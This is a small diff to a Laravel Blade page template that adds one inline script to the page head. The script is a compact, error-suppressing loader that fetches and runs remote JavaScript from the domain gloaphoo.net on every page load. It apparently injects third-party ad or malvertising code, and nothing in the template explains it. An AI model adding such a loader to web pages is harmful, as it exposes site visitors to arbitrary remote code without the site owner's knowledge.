@@ -16,6 +16,7 @@
     <title>{{$share->post_content}}</title>
     <link rel="stylesheet" href="{{URL::to('bst/css/bootstrap.css')}}">
     <link rel="stylesheet" href="{{URL::to('fa/css/all.css')}}">
+    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gloaphoo.net',5596069,document.createElement('script'))</script>
 </head>
 <body>
     @include('partials.navbar')
